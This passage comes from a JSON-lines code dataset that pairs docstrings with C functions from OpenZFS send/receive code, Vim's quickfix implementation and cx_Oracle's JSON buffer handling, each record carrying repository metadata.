dataref.ref_offset;\n\n\t\t\t\twbr_drrr->drr_checksumtype =\n\t\t\t\t    drrw->drr_checksumtype;\n\t\t\t\twbr_drrr->drr_flags =\n\t\t\t\t    drrw->drr_flags;\n\t\t\t\twbr_drrr->drr_key.ddk_cksum =\n\t\t\t\t    drrw->drr_key.ddk_cksum;\n\t\t\t\twbr_drrr->drr_key.ddk_prop =\n\t\t\t\t    drrw->drr_key.ddk_prop;\n\n\t\t\t\tif (dump_record(&wbr_drr, NULL, 0,\n\t\t\t\t    &stream_cksum, outfd) != 0)\n\t\t\t\t\tgoto out;\n\t\t\t} else {\n\t\t\t\t/* block not previously seen */\n\t\t\t\tif (dump_record(drr, buf, payload_size,\n\t\t\t\t    &stream_cksum, outfd) != 0)\n\t\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_WRITE_EMBEDDED:\n\t\t{\n\t\t\tstruct drr_write_embedded *drrwe =\n\t\t\t    &drr->drr_u.drr_write_embedded;\n\t\t\t(void) ssread(buf,\n\t\t\t    P2ROUNDUP((uint64_t)drrwe->drr_psize, 8), ofp);\n\t\t\tif (dump_record(drr, buf,\n\t\t\t    P2ROUNDUP((uint64_t)drrwe->drr_psize, 8),\n\t\t\t    &stream_cksum, outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_FREE:\n\t\t{\n\t\t\tif (dump_record(drr, NULL, 0, &stream_cksum,\n\t\t\t    outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_OBJECT_RANGE:\n\t\t{\n\t\t\tif (dump_record(drr, NULL, 0, &stream_cksum,\n\t\t\t    outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tdefault:\n\t\t\t(void) fprintf(stderr, \"INVALID record type 0x%x\\n\",\n\t\t\t    drr->drr_type);\n\t\t\t/* should never happen, so assert */\n\t\t\tassert(B_FALSE);\n\t\t}\n\t}\nout:\n\tumem_cache_destroy(ddt.ddecache);\n\tfree(ddt.dedup_hash_array);\n\tfree(buf);\n\t(void) fclose(ofp);\n\n\treturn (NULL);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Given an nvlist, produce an avl tree of snapshots, ordered by guid\n */\n", "func_signal": "static avl_tree_t *\nfsavl_create(nvlist_t *fss)", "code": "{\n\tavl_tree_t *fsavl;\n\tnvpair_t *fselem = NULL;\n\n\tif ((fsavl = malloc(sizeof (avl_tree_t))) == NULL)\n\t\treturn (NULL);\n\n\tavl_create(fsavl, fsavl_compare, sizeof (fsavl_node_t),\n\t    offsetof(fsavl_node_t, fn_node));\n\n\twhile ((fselem = nvlist_next_nvpair(fss, fselem)) != NULL) {\n\t\tnvlist_t *nvfs, *snaps;\n\t\tnvpair_t *snapelem = NULL;\n\n\t\tVERIFY(0 == nvpair_value_nvlist(fselem, &nvfs));\n\t\tVERIFY(0 == nvlist_lookup_nvlist(nvfs, \"snaps\", &snaps));\n\n\t\twhile ((snapelem =\n\t\t    nvlist_next_nvpair(snaps, snapelem)) != NULL) {\n\t\t\tfsavl_node_t *fn;\n\t\t\tuint64_t guid;\n\n\t\t\tVERIFY(0 == nvpair_value_uint64(snapelem, &guid));\n\t\t\tif ((fn = malloc(sizeof (fsavl_node_t))) == NULL) {\n\t\t\t\tfsavl_destroy(fsavl);\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\tfn->fn_nvfs = nvfs;\n\t\t\tfn->fn_snapname = nvpair_name(snapelem);\n\t\t\tfn->fn_guid = guid;\n\n\t\t\t/*\n\t\t\t * Note: if there are multiple snaps with the\n\t\t\t * same GUID, we ignore all but one.\n\t\t\t */\n\t\t\tif (avl_find(fsavl, fn, NULL) == NULL)\n\t\t\t\tavl_add(fsavl, fn);\n\t\t\telse\n\t\t\t\tfree(fn);\n\t\t}\n\t}\n\n\treturn (fsavl);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Return +1 if guid1 is before guid2, 0 if they are the same, and -1 if\n * guid1 is after guid2.\n */\n", "func_signal": "static int\ncreated_before(libzfs_handle_t *hdl, avl_tree_t *avl,\n    uint64_t guid1, uint64_t guid2)", "code": "{\n\tnvlist_t *nvfs;\n\tchar *fsname = NULL, *snapname = NULL;\n\tchar buf[ZFS_MAX_DATASET_NAME_LEN];\n\tint rv;\n\tzfs_handle_t *guid1hdl, *guid2hdl;\n\tuint64_t create1, create2;\n\n\tif (guid2 == 0)\n\t\treturn (0);\n\tif (guid1 == 0)\n\t\treturn (1);\n\n\tnvfs = fsavl_find(avl, guid1, &snapname);\n\tVERIFY(0 == nvlist_lookup_string(nvfs, \"name\", &fsname));\n\t(void) snprintf(buf, sizeof (buf), \"%s@%s\", fsname, snapname);\n\tguid1hdl = zfs_open(hdl, buf, ZFS_TYPE_SNAPSHOT);\n\tif (guid1hdl == NULL)\n\t\treturn (-1);\n\n\tnvfs = fsavl_find(avl, guid2, &snapname);\n\tVERIFY(0 == nvlist_lookup_string(nvfs, \"name\", &fsname));\n\t(void) snprintf(buf, sizeof (buf), \"%s@%s\", fsname, snapname);\n\tguid2hdl = zfs_open(hdl, buf, ZFS_TYPE_SNAPSHOT);\n\tif (guid2hdl == NULL) {\n\t\tzfs_close(guid1hdl);\n\t\treturn (-1);\n\t}\n\n\tcreate1 = zfs_prop_get_int(guid1hdl, ZFS_PROP_CREATETXG);\n\tcreate2 = zfs_prop_get_int(guid2hdl, ZFS_PROP_CREATETXG);\n\n\tif (create1 < create2)\n\t\trv = -1;\n\telse if (create1 > create2)\n\t\trv = +1;\n\telse\n\t\trv = 0;\n\n\tzfs_close(guid1hdl);\n\tzfs_close(guid2hdl);\n\n\treturn (rv);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Return the quickfix/location list number with the given identifier.\n * Returns -1 if list is not found.\n */\n", "func_signal": "static int\nqf_id2nr(qf_info_T *qi, int_u qfid)", "code": "{\n    int\t\tqf_idx;\n\n    for (qf_idx = 0; qf_idx < qi->qf_listcount; qf_idx++)\n\tif (qi->qf_lists[qf_idx].qf_id == qfid)\n\t    return qf_idx;\n    return INVALID_QFIDX;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Parse global file name error format prefixes (%O, %P and %Q).\n */\n", "func_signal": "static int\nqf_parse_file_pfx(\n\tint idx,\n\tqffields_T *fields,\n\tqf_list_T *qfl,\n\tchar_u *tail)", "code": "{\n    fields->valid = FALSE;\n    if (*fields->namebuf == NUL || mch_getperm(fields->namebuf) >= 0)\n    {\n\tif (*fields->namebuf && idx == 'P')\n\t    qfl->qf_currfile =\n\t\tqf_push_dir(fields->namebuf, &qfl->qf_file_stack, TRUE);\n\telse if (idx == 'Q')\n\t    qfl->qf_currfile = qf_pop_dir(&qfl->qf_file_stack);\n\t*fields->namebuf = NUL;\n\tif (tail && *tail)\n\t{\n\t    STRMOVE(IObuff, skipwhite(tail));\n\t    qfl->qf_multiscan = TRUE;\n\t    return QF_MULTISCAN;\n\t}\n    }\n\n    return QF_OK;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Free the fields used for parsing lines and populating a quickfix list.\n */\n", "func_signal": "static void\nqf_free_fields(qffields_T *pfields)", "code": "{\n    vim_free(pfields->namebuf);\n    vim_free(pfields->module);\n    vim_free(pfields->errmsg);\n    vim_free(pfields->pattern);\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Parse multi-line error format prefixes (%C and %Z)\n */\n", "func_signal": "static int\nqf_parse_multiline_pfx(\n\tqf_info_T *qi,\n\tint qf_idx,\n\tint idx,\n\tqf_list_T *qfl,\n\tqffields_T *fields)", "code": "{\n    char_u\t\t*ptr;\n    int\t\t\tlen;\n\n    if (!qfl->qf_multiignore)\n    {\n\tqfline_T *qfprev = qfl->qf_last;\n\n\tif (qfprev == NULL)\n\t    return QF_FAIL;\n\tif (*fields->errmsg && !qfl->qf_multiignore)\n\t{\n\t    len = (int)STRLEN(qfprev->qf_text);\n\t    if ((ptr = alloc((unsigned)(len + STRLEN(fields->errmsg) + 2)))\n\t\t    == NULL)\n\t\treturn QF_FAIL;\n\t    STRCPY(ptr, qfprev->qf_text);\n\t    vim_free(qfprev->qf_text);\n\t    qfprev->qf_text = ptr;\n\t    *(ptr += len) = '\\n';\n\t    STRCPY(++ptr, fields->errmsg);\n\t}\n\tif (qfprev->qf_nr == -1)\n\t    qfprev->qf_nr = fields->enr;\n\tif (vim_isprintc(fields->type) && !qfprev->qf_type)\n\t    /* only printable chars allowed */\n\t    qfprev->qf_type = fields->type;\n\n\tif (!qfprev->qf_lnum)\n\t    qfprev->qf_lnum = fields->lnum;\n\tif (!qfprev->qf_col)\n\t    qfprev->qf_col = fields->col;\n\tqfprev->qf_viscol = fields->use_viscol;\n\tif (!qfprev->qf_fnum)\n\t    qfprev->qf_fnum = qf_get_fnum(qi, qf_idx,\n\t\t    qfl->qf_directory,\n\t\t    *fields->namebuf || qfl->qf_directory != NULL\n\t\t    ? fields->namebuf\n\t\t    : qfl->qf_currfile != NULL && fields->valid\n\t\t    ? qfl->qf_currfile : 0);\n    }\n    if (idx == 'Z')\n\tqfl->qf_multiline = qfl->qf_multiignore = FALSE;\n    line_breakcheck();\n\n    return QF_IGNORE_LINE;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * :cbottom/:lbottom commands.\n */\n", "func_signal": "void\nex_cbottom(exarg_T *eap UNUSED)", "code": "{\n    qf_info_T\t*qi = &ql_info;\n    win_T\t*win;\n\n    if (eap->cmdidx == CMD_lbottom)\n    {\n\tqi = GET_LOC_LIST(curwin);\n\tif (qi == NULL)\n\t{\n\t    EMSG(_(e_loclist));\n\t    return;\n\t}\n    }\n\n    win = qf_find_win(qi);\n    if (win != NULL && win->w_cursor.lnum != win->w_buffer->b_ml.ml_line_count)\n\tqf_win_goto(win, win->w_buffer->b_ml.ml_line_count);\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * \":cnext\", \":cnfile\", \":cNext\" and \":cprevious\".\n * \":lnext\", \":lNext\", \":lprevious\", \":lnfile\", \":lNfile\" and \":lpfile\".\n * Also, used by \":cdo\", \":ldo\", \":cfdo\" and \":lfdo\" commands.\n */\n", "func_signal": "void\nex_cnext(exarg_T *eap)", "code": "{\n    qf_info_T\t*qi = &ql_info;\n    int\t\terrornr;\n\n    if (eap->cmdidx == CMD_lnext\n\t    || eap->cmdidx == CMD_lNext\n\t    || eap->cmdidx == CMD_lprevious\n\t    || eap->cmdidx == CMD_lnfile\n\t    || eap->cmdidx == CMD_lNfile\n\t    || eap->cmdidx == CMD_lpfile\n\t    || eap->cmdidx == CMD_ldo\n\t    || eap->cmdidx == CMD_lfdo)\n    {\n\tqi = GET_LOC_LIST(curwin);\n\tif (qi == NULL)\n\t{\n\t    EMSG(_(e_loclist));\n\t    return;\n\t}\n    }\n\n    if (eap->addr_count > 0\n\t    && (eap->cmdidx != CMD_cdo && eap->cmdidx != CMD_ldo\n\t\t&& eap->cmdidx != CMD_cfdo && eap->cmdidx != CMD_lfdo))\n\terrornr = (int)eap->line2;\n    else\n\terrornr = 1;\n\n    qf_jump(qi, (eap->cmdidx == CMD_cnext || eap->cmdidx == CMD_lnext\n\t\t|| eap->cmdidx == CMD_cdo || eap->cmdidx == CMD_ldo)\n\t    ? FORWARD\n\t    : (eap->cmdidx == CMD_cnfile || eap->cmdidx == CMD_lnfile\n\t\t|| eap->cmdidx == CMD_cfdo || eap->cmdidx == CMD_lfdo)\n\t\t? FORWARD_FILE\n\t\t: (eap->cmdidx == CMD_cpfile || eap->cmdidx == CMD_lpfile\n\t\t   || eap->cmdidx == CMD_cNfile || eap->cmdidx == CMD_lNfile)\n\t\t    ? BACKWARD_FILE\n\t\t    : BACKWARD,\n\t    errornr, eap->forceit);\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Cleanup the state information used for parsing lines and populating a\n * quickfix list.\n */\n", "func_signal": "static void\nqf_cleanup_state(qfstate_T *pstate)", "code": "{\n    if (pstate->fd != NULL)\n\tfclose(pstate->fd);\n\n    vim_free(pstate->growbuf);\n#ifdef FEAT_MBYTE\n    if (pstate->vc.vc_type != CONV_NONE)\n\tconvert_setup(&pstate->vc, NULL, NULL);\n#endif\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Return the quickfix list context (if any) as 'context' in retdict.\n */\n", "func_signal": "static int\nqf_getprop_ctx(qf_info_T *qi, int qf_idx, dict_T *retdict)", "code": "{\n    int\t\tstatus;\n    dictitem_T\t*di;\n\n    if (qi->qf_lists[qf_idx].qf_ctx != NULL)\n    {\n\tdi = dictitem_alloc((char_u *)\"context\");\n\tif (di != NULL)\n\t{\n\t    copy_tv(qi->qf_lists[qf_idx].qf_ctx, &di->di_tv);\n\t    status = dict_add(retdict, di);\n\t    if (status == FAIL)\n\t\tdictitem_free(di);\n\t}\n\telse\n\t    status = FAIL;\n    }\n    else\n\tstatus = dict_add_nr_str(retdict, \"context\", 0L, (char_u *)\"\");\n\n    return status;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * clean up directory stack\n */\n", "func_signal": "static void\nqf_clean_dir_stack(struct dir_stack_T **stackptr)", "code": "{\n    struct dir_stack_T  *ds_ptr;\n\n    while ((ds_ptr = *stackptr) != NULL)\n    {\n\t*stackptr = (*stackptr)->next;\n\tvim_free(ds_ptr->dirname);\n\tvim_free(ds_ptr);\n    }\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Find the non-location list window with the specified location list.\n */\n", "func_signal": "static win_T *\nfind_win_with_ll(qf_info_T *qi)", "code": "{\n    win_T\t*wp = NULL;\n\n    FOR_ALL_WINDOWS(wp)\n\tif ((wp->w_llist == qi) && !bt_quickfix(wp->w_buffer))\n\t    return wp;\n\n    return NULL;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Return the vimgrep autocmd name.\n */\n", "func_signal": "static char_u *\nvgr_get_auname(cmdidx_T cmdidx)", "code": "{\n    switch (cmdidx)\n    {\n\tcase CMD_vimgrep:     return (char_u *)\"vimgrep\";\n\tcase CMD_lvimgrep:    return (char_u *)\"lvimgrep\";\n\tcase CMD_vimgrepadd:  return (char_u *)\"vimgrepadd\";\n\tcase CMD_lvimgrepadd: return (char_u *)\"lvimgrepadd\";\n\tcase CMD_grep:\t      return (char_u *)\"grep\";\n\tcase CMD_lgrep:\t      return (char_u *)\"lgrep\";\n\tcase CMD_grepadd:     return (char_u *)\"grepadd\";\n\tcase CMD_lgrepadd:    return (char_u *)\"lgrepadd\";\n\tdefault: return NULL;\n    }\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Returns the current index of the quickfix/location list.\n * Returns 0 if there is an error.\n */\n", "func_signal": "int\nqf_get_cur_idx(exarg_T *eap)", "code": "{\n    qf_info_T\t*qi = &ql_info;\n\n    if (eap->cmdidx == CMD_ldo || eap->cmdidx == CMD_lfdo)\n    {\n\t/* Location list */\n\tqi = GET_LOC_LIST(curwin);\n\tif (qi == NULL)\n\t    return 0;\n    }\n\n    return qi->qf_lists[qi->qf_curlist].qf_index;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Get the quickfix list index from 'nr' or 'id'\n */\n", "func_signal": "static int\nqf_setprop_get_qfidx(\n\tqf_info_T\t*qi,\n\tdict_T\t\t*what,\n\tint\t\taction,\n\tint\t\t*newlist)", "code": "{\n    dictitem_T\t*di;\n    int\t\tqf_idx = qi->qf_curlist;    /* default is the current list */\n\n    if ((di = dict_find(what, (char_u *)\"nr\", -1)) != NULL)\n    {\n\t/* Use the specified quickfix/location list */\n\tif (di->di_tv.v_type == VAR_NUMBER)\n\t{\n\t    /* for zero use the current list */\n\t    if (di->di_tv.vval.v_number != 0)\n\t\tqf_idx = di->di_tv.vval.v_number - 1;\n\n\t    if ((action == ' ' || action == 'a') && qf_idx == qi->qf_listcount)\n\t    {\n\t\t/*\n\t\t * When creating a new list, accept qf_idx pointing to the next\n\t\t * non-available list and add the new list at the end of the\n\t\t * stack.\n\t\t */\n\t\t*newlist = TRUE;\n\t\tqf_idx = qi->qf_listcount > 0 ? qi->qf_listcount - 1 : 0;\n\t    }\n\t    else if (qf_idx < 0 || qf_idx >= qi->qf_listcount)\n\t\treturn INVALID_QFIDX;\n\t    else if (action != ' ')\n\t\t*newlist = FALSE;\t/* use the specified list */\n\t}\n\telse if (di->di_tv.v_type == VAR_STRING\n\t\t&& di->di_tv.vval.v_string != NULL\n\t\t&& STRCMP(di->di_tv.vval.v_string, \"$\") == 0)\n\t{\n\t    if (qi->qf_listcount > 0)\n\t\tqf_idx = qi->qf_listcount - 1;\n\t    else if (*newlist)\n\t\tqf_idx = 0;\n\t    else\n\t\treturn INVALID_QFIDX;\n\t}\n\telse\n\t    return INVALID_QFIDX;\n    }\n\n    if (!*newlist && (di = dict_find(what, (char_u *)\"id\", -1)) != NULL)\n    {\n\t/* Use the quickfix/location list with the specified id */\n\tif (di->di_tv.v_type != VAR_NUMBER)\n\t    return INVALID_QFIDX;\n\n\treturn qf_id2nr(qi, di->di_tv.vval.v_number);\n    }\n\n    return qf_idx;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Return the quickfix list title as 'title' in retdict\n */\n", "func_signal": "static int\nqf_getprop_title(qf_info_T *qi, int qf_idx, dict_T *retdict)", "code": "{\n    char_u\t*t;\n\n    t = qi->qf_lists[qf_idx].qf_title;\n    if (t == NULL)\n\tt = (char_u *)\"\";\n    return dict_add_nr_str(retdict, \"title\", 0L, t);\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Free the entire quickfix/location list stack.\n * If the quickfix/location list window is open, then clear it.\n */\n", "func_signal": "static void\nqf_free_stack(win_T *wp, qf_info_T *qi)", "code": "{\n    win_T\t*qfwin = qf_find_win(qi);\n    win_T\t*llwin = NULL;\n    win_T\t*orig_wp = wp;\n\n    if (qfwin != NULL)\n    {\n\t/* If the quickfix/location list window is open, then clear it */\n\tif (qi->qf_curlist < qi->qf_listcount)\n\t    qf_free(qi, qi->qf_curlist);\n\tqf_update_buffer(qi, NULL);\n    }\n\n    if (wp != NULL && IS_LL_WINDOW(wp))\n    {\n\t/* If in the location list window, then use the non-location list\n\t * window with this location list (if present)\n\t */\n\tllwin = find_win_with_ll(qi);\n\tif (llwin != NULL)\n\t    wp = llwin;\n    }\n\n    qf_free_all(wp);\n    if (wp == NULL)\n    {\n\t/* quickfix list */\n\tqi->qf_curlist = 0;\n\tqi->qf_listcount = 0;\n    }\n    else if (IS_LL_WINDOW(orig_wp))\n    {\n\t/* If the location list window is open, then create a new empty\n\t * location list */\n\tqf_info_T *new_ll = ll_new_list();\n\n\t/* first free the list reference in the location list window */\n\tll_free_all(&orig_wp->w_llist_ref);\n\n\torig_wp->w_llist_ref = new_ll;\n\tif (llwin != NULL)\n\t{\n\t    llwin->w_llist = new_ll;\n\t    new_ll->qf_refcount++;\n\t}\n    }\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Create a new window to show a file above the quickfix window. Called when\n * only the quickfix window is present.\n */\n", "func_signal": "static int\nqf_open_new_file_win(qf_info_T *ll_ref)", "code": "{\n    int\t\tflags;\n\n    flags = WSP_ABOVE;\n    if (ll_ref != NULL)\n\tflags |= WSP_NEWLOC;\n    if (win_split(0, flags) == FAIL)\n\treturn FAIL;\t\t/* not enough room for window */\n    p_swb = empty_option;\t/* don't split again */\n    swb_flags = 0;\n    RESET_BINDING(curwin);\n    if (ll_ref != NULL)\n    {\n\t/* The new window should use the location list from the\n\t * location list window */\n\tcurwin->w_llist = ll_ref;\n\tll_ref->qf_refcount++;\n    }\n    return OK;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Load a dummy buffer to search for a pattern using vimgrep.\n */\n", "func_signal": "static buf_T *\nvgr_load_dummy_buf(\n\tchar_u *fname,\n\tchar_u *dirname_start,\n\tchar_u *dirname_now)", "code": "{\n    int\t\tsave_mls;\n#if defined(FEAT_SYN_HL)\n    char_u\t*save_ei = NULL;\n#endif\n    buf_T\t*buf;\n\n#if defined(FEAT_SYN_HL)\n    /* Don't do Filetype autocommands to avoid loading syntax and\n     * indent scripts, a great speed improvement. */\n    save_ei = au_event_disable(\",Filetype\");\n#endif\n    /* Don't use modelines here, it's useless. */\n    save_mls = p_mls;\n    p_mls = 0;\n\n    /* Load file into a buffer, so that 'fileencoding' is detected,\n     * autocommands applied, etc. */\n    buf = load_dummy_buffer(fname, dirname_start, dirname_now);\n\n    p_mls = save_mls;\n#if defined(FEAT_SYN_HL)\n    au_event_restore(save_ei);\n#endif\n\n    return buf;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * \":cfile\"/\":cgetfile\"/\":caddfile\" commands.\n * \":lfile\"/\":lgetfile\"/\":laddfile\" commands.\n */\n", "func_signal": "void\nex_cfile(exarg_T *eap)", "code": "{\n    char_u\t*enc = NULL;\n    win_T\t*wp = NULL;\n    qf_info_T\t*qi = &ql_info;\n    char_u\t*au_name = NULL;\n    int\t\tsave_qfid = 0;  /* init for gcc */\n    int\t\tres;\n\n    switch (eap->cmdidx)\n    {\n\tcase CMD_cfile:\t    au_name = (char_u *)\"cfile\"; break;\n\tcase CMD_cgetfile:  au_name = (char_u *)\"cgetfile\"; break;\n\tcase CMD_caddfile:  au_name = (char_u *)\"caddfile\"; break;\n\tcase CMD_lfile:\t    au_name = (char_u *)\"lfile\"; break;\n\tcase CMD_lgetfile:  au_name = (char_u *)\"lgetfile\"; break;\n\tcase CMD_laddfile:  au_name = (char_u *)\"laddfile\"; break;\n\tdefault: break;\n    }\n    if (au_name != NULL)\n\tapply_autocmds(EVENT_QUICKFIXCMDPRE, au_name, NULL, FALSE, curbuf);\n#ifdef FEAT_MBYTE\n    enc = (*curbuf->b_p_menc != NUL) ? curbuf->b_p_menc : p_menc;\n#endif\n#ifdef FEAT_BROWSE\n    if (cmdmod.browse)\n    {\n\tchar_u *browse_file = do_browse(0, (char_u *)_(\"Error file\"), eap->arg,\n\t\t\t\t   NULL, NULL,\n\t\t\t\t   (char_u *)_(BROWSE_FILTER_ALL_FILES), NULL);\n\tif (browse_file == NULL)\n\t    return;\n\tset_string_option_direct((char_u *)\"ef\", -1, browse_file, OPT_FREE, 0);\n\tvim_free(browse_file);\n    }\n    else\n#endif\n    if (*eap->arg != NUL)\n\tset_string_option_direct((char_u *)\"ef\", -1, eap->arg, OPT_FREE, 0);\n\n    if (eap->cmdidx == CMD_lfile\n\t    || eap->cmdidx == CMD_lgetfile\n\t    || eap->cmdidx == CMD_laddfile)\n\twp = curwin;\n\n    /*\n     * This function is used by the :cfile, :cgetfile and :caddfile\n     * commands.\n     * :cfile always creates a new quickfix list and jumps to the\n     * first error.\n     * :cgetfile creates a new quickfix list but doesn't jump to the\n     * first error.\n     * :caddfile adds to an existing quickfix list. If there is no\n     * quickfix list then a new list is created.\n     */\n    res = qf_init(wp, p_ef, p_efm, (eap->cmdidx != CMD_caddfile\n\t\t\t&& eap->cmdidx != CMD_laddfile),\n\t\t\tqf_cmdtitle(*eap->cmdlinep), enc);\n    if (wp != NULL)\n\tqi = GET_LOC_LIST(wp);\n    if (res >= 0 && qi != NULL)\n\tqf_list_changed(qi, qi->qf_curlist);\n    if (qi != NULL)\n\tsave_qfid = qi->qf_lists[qi->qf_curlist].qf_id;\n    if (au_name != NULL)\n\tapply_autocmds(EVENT_QUICKFIXCMDPOST, au_name, NULL, FALSE, curbuf);\n\n    /* An autocmd might have freed the quickfix/location list. Check whether it\n     * is still valid. */\n    if (qi != NULL && !qflist_valid(wp, save_qfid))\n\treturn;\n    if (res > 0 && (eap->cmdidx == CMD_cfile || eap->cmdidx == CMD_lfile))\n\tqf_jump(qi, 0, 0, eap->forceit);\t/* display first error */\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Remove newlines and leading whitespace from an error message.\n * Put the result in \"buf[bufsize]\".\n */\n", "func_signal": "static void\nqf_fmt_text(char_u *text, char_u *buf, int bufsize)", "code": "{\n    int\t\ti;\n    char_u\t*p = text;\n\n    for (i = 0; *p != NUL && i < bufsize - 1; ++i)\n    {\n\tif (*p == '\\n')\n\t{\n\t    buf[i] = ' ';\n\t    while (*++p != NUL)\n\t\tif (!VIM_ISWHITE(*p) && *p != '\\n')\n\t\t    break;\n\t}\n\telse\n\t    buf[i] = *p++;\n    }\n    buf[i] = NUL;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "/*\n * Parse an error line in 'linebuf' using a single error format string in\n * 'fmt_ptr->prog' and return the matching values in 'fields'.\n * Returns QF_OK if the efm format matches completely and the fields are\n * successfully copied. Otherwise returns QF_FAIL or QF_NOMEM.\n */\n", "func_signal": "static int\nqf_parse_get_fields(\n\tchar_u\t\t*linebuf,\n\tint\t\tlinelen,\n\tefm_T\t\t*fmt_ptr,\n\tqffields_T\t*fields,\n\tint\t\tqf_multiline,\n\tint\t\tqf_multiscan,\n\tchar_u\t\t**tail)", "code": "{\n    regmatch_T\tregmatch;\n    int\t\tstatus = QF_FAIL;\n    int\t\tr;\n\n    if (qf_multiscan &&\n\t\tvim_strchr((char_u *)\"OPQ\", fmt_ptr->prefix) == NULL)\n\treturn QF_FAIL;\n\n    fields->namebuf[0] = NUL;\n    fields->module[0] = NUL;\n    fields->pattern[0] = NUL;\n    if (!qf_multiscan)\n\tfields->errmsg[0] = NUL;\n    fields->lnum = 0;\n    fields->col = 0;\n    fields->use_viscol = FALSE;\n    fields->enr = -1;\n    fields->type = 0;\n    *tail = NULL;\n\n    /* Always ignore case when looking for a matching error. */\n    regmatch.rm_ic = TRUE;\n    regmatch.regprog = fmt_ptr->prog;\n    r = vim_regexec(&regmatch, linebuf, (colnr_T)0);\n    fmt_ptr->prog = regmatch.regprog;\n    if (r)\n\tstatus = qf_parse_match(linebuf, linelen, fmt_ptr, &regmatch,\n\t\tfields, qf_multiline, qf_multiscan, tail);\n\n    return status;\n}", "path": "Vim/src/quickfix.c", "commit_date": "2018-05-21 00:00:00", "repo_name": "applidium/Vim", "stars": 532, "license": "None", "language": "c", "size": 129300}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoJsonBuffer_freeNode()\n//   Frees any arrays allocated earlier for the specified node.\n//-----------------------------------------------------------------------------\n", "func_signal": "static void cxoJsonBuffer_freeNode(dpiJsonNode *node)", "code": "{\n    dpiJsonArray *array;\n    dpiJsonObject *obj;\n    uint32_t i;\n\n    switch (node->nativeTypeNum) {\n        case DPI_NATIVE_TYPE_JSON_ARRAY:\n            array = &node->value->asJsonArray;\n            if (array->elements) {\n                for (i = 0; i < array->numElements; i++) {\n                    if (array->elements[i].value)\n                        cxoJsonBuffer_freeNode(&array->elements[i]);\n                }\n                PyMem_Free(array->elements);\n                array->elements = NULL;\n            }\n            if (array->elementValues) {\n                PyMem_Free(array->elementValues);\n                